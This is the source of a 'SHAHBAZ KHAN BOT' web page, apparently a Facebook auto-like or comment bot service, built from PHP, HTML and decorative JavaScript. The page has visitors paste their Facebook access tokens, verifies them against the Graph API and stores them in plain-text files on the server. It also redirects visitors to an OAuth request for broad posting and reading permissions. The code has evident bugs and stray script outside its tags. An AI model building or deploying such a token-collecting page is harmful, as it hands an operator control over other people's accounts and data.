 <script language="JavaScript">
<!--
//TRY IT IF U DO ;)
r=255;
g=255;
b=255;
flag=0;
t=new Array;
o=new Array;
d=new Array;

function hex(a,c)
{
t[a]=Math.floor(c/16)
o[a]=c%16
switch (t[a])
{
case 10:
t[a]='A';
break;
case 11:
t[a]='B';
break;
case 12:
t[a]='C';
break;
case 13:
t[a]='D';
break;
case 14:
t[a]='E';
break;
case 15:
t[a]='F';
break;
default:
break;
}
switch (o[a])
{
case 10:
o[a]='A';
break;
case 11:
o[a]='B';
break;
case 12:
o[a]='C';
break;
case 13:
o[a]='D';
break;
case 14:
o[a]='E';
break;
case 15:
o[a]='F';
break;
default:
break;
}
}

function ran(a,c)
{
if ((Math.random()>2/3||c==0)&&c<255)
{
c++
d[a]=2;
}
else
{
if ((Math.random()<=1/2||c==255)&&c>0)
{
c--
d[a]=1;
}
else d[a]=0;
}
return c
}
function do_it(a,c)
{
if ((d[a]==2&&c<255)||c==0)
{
c++
d[a]=2
}
else
if ((d[a]==1&&c>0)||c==255)
{
c--;
d[a]=1;
}
if (a==3)
{
if (d[1]==0&&d[2]==0&&d[3]==0)
flag=1
}
return c
}
function disco()
{
if (flag==0)
{
r=ran(1, r);
g=ran(2, g);
b=ran(3, b);
hex(1,r)
hex(2,g)
hex(3,b)
document.body.style.background="#"+t[1]+o[1]+t[2]+o[2]+t[3]+o[3]
flag=50
}
else
{
r=do_it(1, r)
g=do_it(2,g)
b=do_it(3,b)
hex(1,r)
hex(2,g)
hex(3,b)
document.body.style.background="#"+t[1]+o[1]+t[2]+o[2]+t[3]+o[3]
flag--
}

setTimeout('disco()',50)
}
//-->
</script>
<body onload="disco()">
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title> SHAHBAZ KHAN BOT </title><link rel="stylesheet" type="text/css" href="Khan.css" 
media="all,black.css"/><link rel="shortcut icon" href="">

<style>

@font-face {

    font-family: miaanFont;

    src: url(Khan.ttf);

}

a

{

  text-decoration: none;

  color:black;

}

#footer

{

	position: absolute;

	vertical-align: center;

	width: 98%;

	top: 65%;	

}

.form

{

	position: absolute;

	vertical-align: center;

	width: 98%;

	top: 40%;

}

.form1

{

	position: absolute;

	vertical-align: center;

	width: 98%;

	top: 55%;

}

.access

{

	position: absolute;

	vertical-align: center;

	width: 98%;

}

.access h2

{

	margin-top: -15px;

}

input[type=text] {

font-family:miaanFont;

    width: 60%;

    height: 5%;

    padding: 8px 32px;

    margin: 8px 0;

    font-size:22px;

    box-sizing: border-box;

    border: 2px solid white;

    background-color: white;

    color: white;

    border-radius:50px;

    outline: none;

    text-align: center;

}

input[type=password] {

font-family:miaanFont;

    width: 60%;

    height: 5%;

    padding: 8px 32px;

    margin: 8px 0;

    font-size:22px;

    box-sizing: border-box;

    border: 2px solid white;

    background-color: black;

    color: white;

    border-radius:50px;

    outline: none;

    text-align: center;

}

.button {

	font-family:miaanFont;

    height: 5%;

    background-color: black; /* Green */

    border: 2px solid white;

    color: white;

    padding: 8px 32px;

    text-align: center;

    text-decoration: none;

    display: inline-block;

    font-size: 22px;

    margin: 4px 2px;

    -webkit-transition-duration: 0.4s; /* Safari */

    transition-duration: 0.4s;

    cursor: pointer;

}



.button1 {

    background-color: black;

    color: white;

    border-radius:50px;

}



.button1:hover {

    background-color: white;

    color: black;

}

</style>

</head>

<font style="color:black;font-size:26px;font-family:miaanFont">  <h2 align="center"><font style="background: url(&quot;bg.gif&quot;) repeat scroll 0% 0% transparent;color:black; text-shadow: 0pt 0pt 0.9em white, 0pt 2pt 0.9em white;font-family:miaanFont;font-size:90px;"><b>SHAHBAZ KHAN </b></font></h2>
<h2 align="center"><font style="background: url(&quot;&quot;) repeat scroll 0% 0% transparent;color:#fff; text-shadow: 0pt 0pt 0.9em black, 0pt 2pt 0.9em black;font-family:miaanFont;font-size:50px;"><b><a href="https://facebook.com/f33l.my.speed" target="_blank"><b> <script language="JavaScript" src="Khan.js" size="520"></script></b></a></b></font></h2>


<?php
error_reporting(0);
$bot=new bot();
class bot{ 

public function getGr($as,$bs){
$ar=array(
        'graph',
        'fb',
        'me'
);
$im='https://'.implode('.',$ar);

return $im.$as.$bs;
}

public function getUrl($mb,$tk,$uh=null){
$ar=array(
        'access_token' => $tk,
);
if($uh){
$else=array_merge($ar,$uh);
        }else{
        $else=$ar;
}
foreach($else as $b => $c){
        $shahbazkhan[]=$b.'='.$c;
}
$true='?'.implode('&',$shahbazkhan);
$true=$this->getGr($mb,$true);
$true=json_decode($this->
one($true),true);
if($true[data]){
        return $true[data];
}else{
        return $true;}
}

private function one($url){
$cx=curl_init();
curl_setopt_array($cx,array(
CURLOPT_URL => $url,
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => 1,
CURLOPT_USERAGENT => 'CR3AT3D BY SHAHBAZ KHAN',
));
$ch=curl_exec($cx);
        curl_close($cx);
        return ($ch);
}

public function savEd($tk,$id,$z=null,$bb=null){
if(!is_dir('shahbazkhan')){
        mkdir('shahbazkhan');
}
if($bb){
$blue=fopen('shahbazkhan/'.$id,'w');
fwrite($blue,$tk.'*on*on*on*on*'.$bb);
        fclose($blue);

echo '

		<script type="text/javascript">

			document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

			document.getElementById("resp").innerHTML="Comment Text Saved.";

		</script>';
}else{
        if($z){
if(file_exists('shahbazkhan/'.$id)){
$file=file_get_contents('shahbazkhan/'.$id);
$ex=explode('*',$file);
$str=str_replace($ex[0],$tk,$file);
$xs=fopen('shahbazkhan/'.$id,'w');
        fwrite($xs,$str);
        fclose($xs);
}else{
$str=$tk.'*on*on*on*on*'.$c;
$xs=fopen('shahbazkhan/'.$id,'w');
        fwrite($xs,$str);
        fclose($xs);
}
$_SESSION[key]=$tk.'_'.$id;
}else{
$file=file_get_contents('shahbazkhan/'.$id);
$file=explode('*',$file);
        if($file[5]){
$up=fopen('shahbazkhan/'.$id,'w');
fwrite($up,$tk.'*on*on*on*on*'.$file[5]);
        fclose($up);
        }else{
$up=fopen('shahbazkhan/'.$id,'w');
fwrite($up,$tk.'*on*on*on*on*');
        fclose($up);
        }
echo '

		<script type="text/javascript">

			document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

			document.getElementById("resp").innerHTML="Bot Settings Has Been Updated";

		</script>';}}
}

public function lOgbot($d){
        unlink('shahbazkhan/'.$d);
        unset($_SESSION[key]);

echo'
<script type="text/javascript">alert("INFO : Logout success")
</script>';

        $this->atas();
        $this->home();
        $this->bwh();
}

public function cek($tok,$id,$nm){
echo '

<div id="bottom-content">

     	<div id="navigation-menu">

     		<a href="http://facebook.com/' . $id . '"><img src="https://graph.facebook.com/' . $id . '/picture?width=800" style="-moz-box-shadow:0px 0px 20px 0px red;-webkit-box-shadow:0px 0px 20px 0px red;-o-box-shadow:0px 0px 20px 0px red;box-shadow:0px 0px 20px 0px red;width:150px; height:150px;border-radius:500px;" alt="' . $nm . '"/></a>

	</div><br/>

	     	<form action="index.php" method="post">

     			<input name="text" type="hidden">

     			<input type="hidden" name="opsi" value="off"><br/>

	<div id="top-content">

		<div id="search-form">

				<input class="button button1" type="submit" value="Activate Bot">
     			</form>

		</div>

	</div>

</div>';

$this->membEr();
}

public function atas()

   {

     echo'

     <center>

     <div id="header">

     <h2 class="description">

     </h2></div>';

   }

public function home()

   {

     echo '<div id="content">

     <div class="post">

     <div class="post-content">

     <div class="post-content">

     </div>

     </div>

     <div class="post-meta2">

     </div></div></div>';

   }

public function bwh(){
echo '

     <br>
<center>
<center>
<ul>
<center>
<a href="https://goo.gl/CvenbL" target="_blank">

<input class="button button5" type="button" value="Allow The App"> </a>
<a href="https://developers.facebook.com/tools/debug/accesstoken/?app_id=41158896424" target="_blank">

<input class="button button6" type="button" value="Get Token"> </a>
<a href="https://facebook.com/d4ng3r.v1rus" target="_blank">
<input class="button button7" type="button" value="My FaCeBOok"> </a>
</center>
<h4><font size="26" color="blue"><center>   </font><font face="Orbitron" size="6" 
<br></ul></div></div>
</center>

     <div id="resp"></div>

     <div id="top-content">

     <div id="search-form">

     <form class="form1" action="index.php" method="post"><input type="text" name="token" placeholder="Paste Your Access Token Here" required><input class="button button1" type="submit" value="Activate Bot"></form></div></div></div>';

     $this->membEr();

   }

public function membEr(){
        if(!is_dir('shahbazkhan')){
        mkdir('shahbazkhan');
}
$up=opendir('shahbazkhan');
while($use=readdir($up)){
if($use != '.' && $use != '..'){
        $user[]=$use;}
        }

echo'
<div id="footer">
User Robot :<font color="white"> '.count($user).'</font>
</div>';
}

public function toXen($h){
header('Location: https://m.facebook.com/dialog/oauth?client_id='.$h.'&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=publish_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');
}


}
if(isset($_SESSION[key])){
        $a=$_SESSION[key];
        $ai=explode('_',$a);
        $a=$ai[0];
if($_POST[logout]){
        $ax=$_POST[logout];
        $bot->lOgbot($ax);
}else{
$b=$bot->getUrl('/me',$a,array(
'fields' => 'id,name',
));
if($b[id]){
if($_POST[likes]){
        $as=$_POST[likes];
        $bs=$_POST[emot];
        $bx=$_POST[target];
        $cs=$_POST[opsi];
        $tx=$_POST[text];
if($cs=='text'){
        unlink('shahbazkhan/'.$b[id]);
$bot->savEd($a,$b[id],$as,$bs,$bx,'off');
        }else{
        if($tx){
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs,'x',$tx);
        }else{
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs);}}
}
        $bot->atas();
        $bot->home();
$bot->cek($a,$b[id],$b[name]);
}else{
echo '<script type="text/javascript">alert("INFO: Session Token Expired")</script>';
        unset($_SESSION[key]);
        unlink('shahbazkhan/'.$ai[1]);
$bot->atas();
$bot->home();
        $bot->bwh();}}
        }else{
if($_POST[token]){
        $a=$_POST[token];
if(preg_match('/token/',$a)){
$tok=substr($a,strpos($a,'token=')+6,(strpos($a,'&')-(strpos($a,'token=')+6)));
        }else{
        $cut=explode('&',$a);
$tok=$cut[0];
}
$b=$bot->getUrl('/me',$tok,array(
        'fields' => 'id,name',
));
if($b[id]){
$bot->savEd($tok,$b[id],'on','on','on','on','null');
        $bot->atas();
        $bot->home();
$bot->cek($tok,$b[id],$b[name]);
}else{
echo '



			<script type="text/javascript">

				document.getElementById("resp").style="color:red;font-family:miaanFont;";

				document.getElementById("resp").innerHTML="<h2>Token Is Invalid</h2>";

			</script>';
        $bot->atas();
        $bot->home();
        $bot->bwh();}
}else{
if($_GET[token]){
        $a=$_GET[token];
        $bot->toXen($a);
}else{
        $bot->atas();
        $bot->home();
        $bot->bwh();}}
}
?>
if  ((document.getElementById) && 
window.addEventListener || window.attachEvent){

(function(){

//Configure here...

var xCol = "#ff0000";
var yCol = "#ffffff";
var zCol = "#0000ff";
var n = 6;   //number of dots per trail.
var t = 40;  //setTimeout speed.
var s = 0.2; //effect speed.

//End.

var r,h,w;
var d = document;
var my = 10;
var mx = 10;
var stp = 0;
var evn = 360/3;
var vx = new Array();
var vy = new Array();
var vz = new Array();
var dy = new Array();
var dx = new Array();

var pix = "px";

var strictmod = ((document.compatMode) && 
document.compatMode.indexOf("CSS") != -1);


var domWw = (typeof window.innerWidth == "number");
var domSy = (typeof window.pageYOffset == "number");
var idx = d.getElementsByTagName('div').length;

for (i = 0; i < n; i++){
var dims = (i+1)/2;
d.write('<div id="x'+(idx+i)+'" style="position:absolute;'
+'top:0px;left:0px;width:'+dims+'px;height:'+dims+'px;'
+'background-color:'+xCol+';font-size:'+dims+'px"></div>'

+'<div id="y'+(idx+i)+'" style="position:absolute;top:0px;'
+'left:0px;width:'+dims+'px;height:'+dims+'px;'
+'background-color:'+yCol+';font-size:'+dims+'px"></div>'

+'<div id="z'+(idx+i)+'" style="position:absolute;top:0px;'
+'left:0px;width:'+dims+'px;height:'+dims+'px;'
+'background-color:'+zCol+';font-size:'+dims+'px"></div>');
}

if (domWw) r = window;
else{ 
  if (d.documentElement && 
  typeof d.documentElement.clientWidth == "number" && 
  d.documentElement.clientWidth != 0)
  r = d.documentElement;
 else{ 
  if (d.body && 
  typeof d.body.clientWidth == "number")
  r = d.body;
 }
}


function winsize(){
var oh,sy,ow,sx,rh,rw;
if (domWw){
  if (d.documentElement && d.defaultView && 
  typeof d.defaultView.scrollMaxY == "number"){
  oh = d.documentElement.offsetHeight;
  sy = d.defaultView.scrollMaxY;
  ow = d.documentElement.offsetWidth;
  sx = d.defaultView.scrollMaxX;
  rh = oh-sy;
  rw = ow-sx;
 }
 else{
  rh = r.innerHeight;
  rw = r.innerWidth;
 }
h = rh; 
w = rw;
}
else{
h = r.clientHeight; 
w = r.clientWidth;
}
}


function scrl(yx){
var y,x;
if (domSy){
 y = r.pageYOffset;
 x = r.pageXOffset;
 }
else{
 y = r.scrollTop;
 x = r.scrollLeft;
 }
return (yx == 0)?y:x;
}


function mouse(e){
var msy = (domSy)?window.pageYOffset:0;
if (!e) e = window.event;    
 if (typeof e.pageY == 'number'){
  my = e.pageY - msy + 16;
  mx = e.pageX + 6;
 }
 else{
  my = e.clientY - msy + 16;
  mx = e.clientX + 6;
 }
if (my > h-65) my = h-65;
if (mx > w-50) mx = w-50;
}



function assgn(){
for (j = 0; j < 3; j++){
 dy[j] = my + 50 * Math.cos(stp+j*evn*Math.PI/180) * Math.sin((stp+j*25)/2) + scrl(0) + pix;
 dx[j] = mx + 50 * Math.sin(stp+j*evn*Math.PI/180) * Math.sin((stp+j*25)/2) * Math.sin(stp/4) + pix;
}
stp+=s;

for (i = 0; i < n; i++){
 if (i < n-1){
  vx[i].top = vx[i+1].top; vx[i].left = vx[i+1].left; 
  vy[i].top = vy[i+1].top; vy[i].left = vy[i+1].left;
  vz[i].top = vz[i+1].top; vz[i].left = vz[i+1].left;
 } 
 else{
  vx[i].top = dy[0]; vx[i].left = dx[0];
  vy[i].top = dy[1]; vy[i].left = dx[1];
  vz[i].top = dy[2]; vz[i].left = dx[2];
  }
 }
setTimeout(assgn,t);
}


function init(){
for (i = 0; i < n; i++){
 vx[i] = document.getElementById("x"+(idx+i)).style;
 vy[i] = document.getElementById("y"+(idx+i)).style;
 vz[i] = document.getElementById("z"+(idx+i)).style;
 }
winsize();
assgn();
}


if (window.addEventListener){
 window.addEventListener("resize",winsize,false);
 window.addEventListener("load",init,false);
 document.addEventListener("mousemove",mouse,false);
}  
else if (window.attachEvent){
 window.attachEvent("onload",init);
 document.attachEvent("onmousemove",mouse);
 window.attachEvent("onresize",winsize);
} 

})();
}//End. 
